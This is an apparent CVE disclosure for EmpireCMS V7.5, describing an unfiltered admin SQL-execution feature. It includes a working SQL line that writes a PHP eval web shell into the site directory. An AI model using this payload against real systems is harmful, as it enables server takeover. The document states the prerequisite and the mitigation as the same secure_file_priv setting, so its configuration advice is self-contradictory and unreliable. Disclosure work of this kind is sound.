# CVE2023-50162
## Vulnerability: SQL Statement Execution File Upload Remote Code Execution (RCE)
### [NAME OF AFFECTED PRODUCT(S)]:EmpireCMS
### [AFFECTED AND/OR FIXED VERSION(S)]: V7.5
### [PROBLEM TYPE] SQL Statement Execution File Upload Remote Code Execution (RCE)
## [DESCRIPTION]
Accessing the backend:

![image](https://github.com/Teresazdy/CVE/assets/72858713/3d1f8193-9eb2-49af-b6a6-1dacc4c5ee64)

Execute the following SQL statement:

select '<?php eval($_POST[1]);?>' into dumpfile '/Users/zhaozhouqiao/site/evil.php';

You can see that the file has been successfully written.

![image](https://github.com/Teresazdy/CVE/assets/72858713/fe2de9d7-208a-4b6f-bce2-92a9c0a301dc)

Subsequently, access evil.php to execute the code:

![image](https://github.com/Teresazdy/CVE/assets/72858713/3be1ce72-87a2-466f-aa03-14eaffe77cdd)

Note: The prerequisite is that the MySQL variable secure_file_priv must be set to null.

## Code Analysis:
Firstly, in the following code snippet, the content of the POST request is directly passed to the DoExecSql function without any filtering.

![image](https://github.com/Teresazdy/CVE/assets/72858713/88f38910-b703-4ed7-b072-92997893136b)

The code below passes the content of the query variable to DoRunQuery for execution:

![image](https://github.com/Teresazdy/CVE/assets/72858713/1f9c3215-3a7b-4dd1-952c-854d1f973f45)

The execution process lacks any filtering, directly executing the SQL statements provided by the user:

![image](https://github.com/Teresazdy/CVE/assets/72858713/e27ce18f-d942-4d3c-aa82-da5bc9c88ee9)

Therefore, it is possible to achieve arbitrary file upload using statements like select into outfile.

## Mitigation Measures:
Set secure_file_priv for the MySQL database to null to prevent file uploads.






